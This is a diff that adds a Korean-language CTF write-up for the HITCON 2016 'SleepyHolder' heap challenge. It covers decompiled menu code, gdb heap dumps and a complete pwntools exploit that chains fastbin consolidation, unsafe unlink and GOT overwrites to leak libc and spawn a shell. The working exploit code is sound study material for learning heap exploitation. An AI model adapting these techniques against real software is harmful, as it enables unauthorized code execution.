@@ -623,3 +623,259 @@ t.interactive()
 원샷 되는게 없는 것 같다.. (아니 한달만에 문제를 풀다니..)
 
 아ㅏㅏㅏㅏ 리버싱을 잘하고 싶다... 
+
+<br>
+
+# Hitcon2016 - SleepyHolder
+
+fastbin consolidate을 이용해서 하는 문제다. 이게 뭐냐면 fast chunk를 free 해서 fastbin에 넣은 후 large chunk 를 할당하게 되면 fastbin에 남아있는 상태로 smallbin에도 추가되어 버린다. 더블 프리 시 fast top 검증을 피할 수 있다.
+
+이게 정확히 왜 되는지는.. 소스를 보긴 했지만 아직 잘 모르겠다.. (복잡) 
+
+아무튼 이 문제를 보면
+
+```c
+unsigned __int64 sub_40093D()
+{
+  int v0; // eax
+  char s; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  puts("What secret do you want to keep?");
+  puts("1. Small secret");
+  puts("2. Big secret");
+  if ( !huge_pointer )
+    puts("3. Keep a huge secret and lock it forever");
+  memset(&s, 0, 4uLL);
+  read(0, &s, 4uLL);
+  v0 = atoi(&s);
+  if ( v0 == 2 )
+  {
+    if ( !big_pointer )
+    {
+      big_inputbuf = calloc(1uLL, 0xFA0uLL);
+      big_pointer = 1;
+      puts("Tell me your secret: ");
+      read(0, big_inputbuf, 0xFA0uLL);
+    }
+  }
+  else if ( v0 == 3 )
+  {
+    if ( !huge_pointer )
+    {
+      huge_inputbuf = calloc(1uLL, 0x61A80uLL);
+      huge_pointer = 1;
+      puts("Tell me your secret: ");
+      read(0, huge_inputbuf, 0x61A80uLL);
+    }
+  }
+  else if ( v0 == 1 && !small_pointer )
+  {
+    buf = calloc(1uLL, 0x28uLL);
+    small_pointer = 1;
+    puts("Tell me your secret: ");
+    read(0, buf, 0x28uLL);
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+save secret
+
+```c
+unsigned __int64 sub_400B01()
+{
+  int v0; // eax
+  char s; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  puts("Which Secret do you want to wipe?");
+  puts("1. Small secret");
+  puts("2. Big secret");
+  memset(&s, 0, 4uLL);
+  read(0, &s, 4uLL);
+  v0 = atoi(&s);
+  if ( v0 == 1 )
+  {
+    free(buf);
+    small_pointer = 0;
+  }
+  else if ( v0 == 2 )
+  {
+    free(big_inputbuf);
+    big_pointer = 0;
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+delete secret
+
+```c
+unsigned __int64 sub_400BD0()
+{
+  int v0; // eax
+  char s; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  puts("Which Secret do you want to renew?");
+  puts("1. Small secret");
+  puts("2. Big secret");
+  memset(&s, 0, 4uLL);
+  read(0, &s, 4uLL);
+  v0 = atoi(&s);
+  if ( v0 == 1 )
+  {
+    if ( small_pointer )
+    {
+      puts("Tell me your secret: ");
+      read(0, buf, 0x28uLL);
+    }
+  }
+  else if ( v0 == 2 && big_pointer )
+  {
+    puts("Tell me your secret: ");
+    read(0, big_inputbuf, 0xFA0uLL);
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+update secret
+
+크게 3가지 메뉴만 있다. save secret 시에 fast chunk, small chunk, large chunk 이렇게 각각 1개 씩 만들 수 있고 delete로 free 시킬 수 있다. 하지만 chunk는 각 1개씩 밖에 못만든다.(그래도 chunk pointer는 살아 있다.)
+
+딱 chunk 할당만 봐도 저 녀석을 이용해 fastbin attack일 거라 생각했지만 fast chunk의 크기가 0x30으로 정해져 있다. 이 사이즈로는 이 문제에서 익스할 수 있는 벡터가 존재하지 않는다.. 
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk
+0x964000            0x0                 0x2c0                Used                None              None
+0x9642c0            0x0                 0x30                 Freed                0x0    0x7f12fef48b98
+0x9642f0            0x30                0xfb0                Used                None              None
+gdb-peda$ ar
+==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x9642c0 --> 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x9652a0 (size : 0x1fd60)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x030)  smallbin[ 1]: 0x9642c0 (invaild memory)
+```
+
+smallbin에 넣을 수 있지만 여기서 뭘 할 수 있는지 좀 막혀있다가
+
+```c
+0x6020c0:	0x0000000000964300	0x00007f12ff0ff010
+0x6020d0:	0x00000000009642d0	0x0000000100000001
+0x6020e0:	0x0000000000000000	0x0000000000000000
+    
+buf = calloc(1uLL, 0x28uLL);
+small_pointer = 1;
+puts("Tell me your secret: ");
+read(0, buf, 0x28uLL);
+```
+
+이렇게 chunk pointer들이 free되도 남아있다. 또 fast chunk를 할당받을 때 small chunk의 prev_size 까지 쓰게 해주는게 보인다. 게다가 형태마저 hitcon training에서 봤던 unsafe unlink 하기 딱 좋은 형태다. unlink를 하기 위해서 fastbin consolidate가 필요한듯
+
+```c
+gdb-peda$ x/32gx 0x1c86650
+0x1c86650:	0x0000000000000000	0x0000000000000031
+0x1c86660:	0x0000000000000000	0x00000000000209a1
+0x1c86670:	0x00000000006020b8	0x00000000006020c0
+0x1c86680:	0x0000000000000020	0x0000000000000fb0
+0x1c86690:	0x0000000000000061	0x0000000000000000
+
+gdb-peda$ x/32gx 0x6020b0
+0x6020b0 <stdout>:	0x00007fe2188cd620	0x0000000000000000
+0x6020c0:	0x0000000001c86690	0x00007fe218a83010
+0x6020d0:	0x00000000006020b8	0x0000000100000000
+0x6020e0:	0x0000000000000001	0x0000000000000000
+```
+
+unlink를 해주면 이렇게 이쁘게 박힌다. 그 다음 small secret pointer에 atoi_got를 넣고 거기에 puts_plt를 넣고 메뉴 선택할 때 puts_got를 넣으려고 했는데 계속 안돼서 삽질하다보니 이게 atoi 인자로 4바이트 밖에 쓸 수가 없어서 그랬다… (갱장한 삽질이었음)
+
+```c
+gdb-peda$ x/32gx 0x6020b0
+0x6020b0 <stdout>:	0x00007f69c2930620	0x0000000000000000
+0x6020c0:	0x0000000000602080	0x0000000000602080
+0x6020d0:	0x0000000000602018	0x0000000100000000
+0x6020e0:	0x0000000000000001	0x0000000000000000
+
+gdb-peda$ x/gx 0x0000000000602018
+0x602018 <free@got.plt>:	0x0000000000400760
+```
+
+1 pointer에 free_got를 넣고 free_got에 puts_plt를 넣고 2 pointer를 free 시키면 릭 가능!
+
+```python
+from pwn import *
+
+t = process('./sleepyholder')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def save(a,b):
+	r("3. Renew secret\n")
+	s("1")
+	r("2. Big secret\n")
+	s(str(a))
+	r(": \n")
+	t.send(str(b))
+
+def de(a):
+	r("3. Renew secret\n")
+	s("2")
+	r("2. Big secret\n")
+	s(str(a))
+
+def renew(a,b):
+	r("3. Renew secret\n")
+	s("3")
+	r("2. Big secret\n")
+	s(str(a))
+	r(": \n")
+	t.send(str(b))
+
+atoi_got = 0x602080
+puts_plt = 0x0000000000400760
+puts_got = 0x602020
+free_got = 0x602018
+
+save(1,'a')
+save(2,'a')
+de(1)
+save(3,'b')
+de(1)
+
+save(1,p64(0) + p64(0x21) + p64(0x6020d0 - 0x18) + p64(0x6020d0 - 0x10) + p64(0x20))
+de(2)
+
+renew(1,p64(0) + p64(atoi_got)*2 + p64(free_got))
+renew(1,p64(puts_plt))
+de(2)
+
+libc = u64(t.recv(6).ljust(8,'\x00')) - 0x36e80
+log.success("libc ==> " + hex(libc))
+system = libc + 0x45390
+
+renew(1,p64(system))
+save(2,'sh\x00')
+de(2)
+
+t.interactive()
+->
+$ id
+uid=1000(bskim)
+```
+
+그 후엔 똑같이 free_got를 system으로 바꾸고 atoi_got에 sh를 쓰고 2 pointer를 free 해주면 쉘 ! 또 하나의 문제점 이었던거는.. secret 입력할 때 sendline으로 보내버려서 got 덮을 때 계속 에러가 나서 거기서도 시간을 많이 버렸다..(send와 sendline은 진짜 적절하게 잘 써야 함 ㅠ) 그래도 이건 search에 비하면 훠얼씬 수월했다..(메뉴 적은게 체고시다)
